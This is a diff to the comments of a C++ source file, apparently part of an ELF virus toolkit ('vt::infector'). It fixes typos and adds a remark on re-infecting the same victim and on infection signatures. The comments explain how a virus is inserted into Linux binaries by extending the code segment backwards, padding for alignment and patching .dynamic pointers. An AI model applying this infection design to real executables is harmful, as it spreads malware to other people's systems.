@@ -15,8 +15,8 @@ namespace vt::infector {
 // padding infection. This algorithm is also carefully crafted to handle special
 // cases when the victim's CODE segment starts from offset zero, where the
 // insertion point must be adjusted to leave space for the Elf header structure.
-// The normal happy case (hopfully the linker default) usually has a read-only
-// segment precedding CODE, which has a non-zero file offset.
+// The normal happy case (hopefully the linker default) usually has a read-only
+// segment preceding CODE, which has a non-zero file offset.
 //
 // Inserting to zero offset CODE segment:
 //  host elf structure                           infected elf structure
@@ -40,19 +40,19 @@ namespace vt::infector {
 //  shdrs                                        non-exec sections
 //                                               shdrs
 //
-// The insertion choice is simply, as we have to append to the begining of CODE
+// The insertion choice is simply, as we have to append to the beginning of CODE
 // in order to extend vaddr backwards. The only difference is the former needs
-// to do a little bit more work to accomodate the elf header and make the virus
+// to do a little bit more work to accommodate the elf header and make the virus
 // rodata relocation safe.
 //
 // Another modification of this infection algorithm is that we pad the virus to
 // always start at page aligned address/offset so that it makes virus rodata
 // relocation safe on aarch64, at the expense of a slightly larger binary (4k
-// larger at amost). This is important for viruses that merges .text and .rodata
-// on aarch64. Although x86-64 doesn't care, we bake this in for both arch to
-// reduce algorithm complexity.
+// larger at at most). This is important for viruses that merges .text and
+// .rodata on aarch64. Although x86-64 doesn't care, we bake this in for both
+// arch to reduce algorithm complexity.
 //
-// This is achieved by padding the virus to accomodate the elf header structure
+// This is achieved by padding the virus to accommodate the elf header structure
 // if the original CODE segment starts from zero file offset:
 //
 // |Elf Header|============|      virus       |=============| original CODE
@@ -64,6 +64,11 @@ namespace vt::infector {
 // Another important piece to make this algorithm work is to shift the pointers
 // inside the .dynamic section, as they no longer point to to correct vaddr
 // after virus insertion.
+//
+// Note that this algorithm is safe to recursively infect the victim, as long as
+// the vaddr space is not exhausted (the lowest address we can reverse into is
+// decided by the mmap_min_addr kernel configuration). It's recommended to use
+// an infection signature to avoid this.
 //
 // Sadly this algorithm so far only works for non-pie's. Nonetheless, if a
 // victim is found, it could potentially to fit a large virus with an added
